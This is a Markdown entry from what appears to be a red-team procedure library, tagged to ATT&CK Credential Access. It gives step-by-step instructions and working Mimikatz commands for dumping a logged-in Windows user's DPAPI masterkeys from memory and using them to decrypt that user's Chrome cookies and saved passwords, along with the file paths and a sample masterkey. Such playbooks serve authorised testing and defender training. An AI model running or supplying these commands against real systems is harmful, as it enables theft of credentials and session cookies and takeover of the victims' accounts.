---
id: 65770273-7e84-4c90-bde3-559d281dd907
name: Extract Chrome Cookies and Credentials from a Logged-in User's Profile
type: procedure
verified: false
submitted: false
created_at: '2020-07-21T05:09:20.687962+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
techniques:
- '[[Credentials from Web Browsers]]'
platforms:
- Windows
tags:
- '[[Chrome]]'
- '[[dump]]'
- '[[extract]]'
commands:
- '[[Mimikatz Dump Masterkeys in Memory]]'
- '[[Mimikatz Extract Chrome Credentials with the Masterkey]]'
---

# Extract Chrome Cookies and Credentials from a Logged-in User's Profile

## Summary

Extract a logged in user's masterkey from memory, and use it to extract their profile's Chrome cookies or credentials. This approach requires both the user be currently logged in, and the attacker have command execution as Administrator. 

## Description

# Description

Extract a logged in user's masterkey from memory, and use it to extract their profile's Chrome cookies or credentials. This approach requires both the user be currently logged in, and the attacker have command execution as Administrator.

# Instructions

1. Copy Mimikatz to the target: [Download from GitHub](https://github.com/gentilkiwi/mimikatz)

2. Execute Mimikatz as Administrator and dump masterkeys in memory.

**Command** ([[Mimikatz Dump Masterkeys in Memory]]):

```bash
mimikatz.exe "sekurlsa::dpapi" "exit"
```

Example masterkey: daef77bbf4c8fae8ceac6aec0f4014ae8ec88c266073efafa74bcd86f51b30f2697556b072f91d3dbf0ab9ca118614866261d8620d4158c500fc51d15872c723

3. Identify the location of cookies or passwords, generally stored in the following location:

- Cookies: C:\Users\$_USERNAME\AppData\Local\\Google\Chrome\User Data\Default\Cookies

- Credentials: C:\Users\$_USERNAME\AppData\Local\Google\Chrome\User Data\Default\Login Data

4. Use the target user's masterkey to decrypt their cookies or credentials. This may be easier to execute from a Mimikatz prompt, as the nested quotes can be awkward when executing from a cmd or Powershell prompt.

**Command** ([[Mimikatz Extract Chrome Credentials with the Masterkey]]):

```bash
mimikatz.exe
dpapi::chrome /in:"C:\Users\$_TARGET_USER\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect /masterkey:$_MASTER_KEY
```

## Platforms

- Windows

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]

### Techniques

- [[Credentials from Web Browsers]]

## Commands Used

- [[Mimikatz Dump Masterkeys in Memory]]
- [[Mimikatz Extract Chrome Credentials with the Masterkey]]

## Tags

- [[Chrome]]
- [[dump]]
- [[extract]]
